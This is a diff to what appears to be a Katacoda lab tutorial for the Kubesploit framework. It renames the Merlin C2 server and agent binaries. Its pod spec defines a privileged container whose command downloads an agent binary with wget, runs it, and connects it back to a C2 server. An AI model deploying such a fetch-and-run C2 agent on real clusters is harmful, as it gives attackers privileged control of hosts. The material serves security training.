@@ -11,7 +11,7 @@ The server IP that should be inside the Interface is `echo $HOST_IP`{{execute}}.
 
 Verify that the `config.yaml` file contains the server IP address: `cat config.yaml`{{execute T1}}
 
-Start the server `./merlinServer-Linux-x64`{{execute T1}}.    
+Start the server `./kubesploitServer-Linux-x64`{{execute T1}}.    
 To view the menu, run `help`{{execute}} and to see the list of modules run `use module <TAB>`.  
 *You can use the `TAB` in any place to see the list commands.  
 
@@ -29,7 +29,7 @@ spec:
   containers:
   - name: priv-container
     image: ubuntu
-    command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/g3rzi/katacodaScenario/releases/download/0.1/merlinAgent-Linux-x64 && chmod +x merlinAgent-Linux-x64 && ./merlinAgent-Linux-x64 -url https://$HOST_IP:443", "sleep infinity" ]
+    command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/g3rzi/katacodaScenario/releases/download/0.1/kubesploitAgent-Linux-x64_katacoda && chmod +x kubesploitAgent-Linux-x64_katacoda && ./kubesploitAgent-Linux-x64_katacoda -url https://$HOST_IP:443", "sleep infinity" ]
     securityContext:
       privileged: true
     volumeMounts:
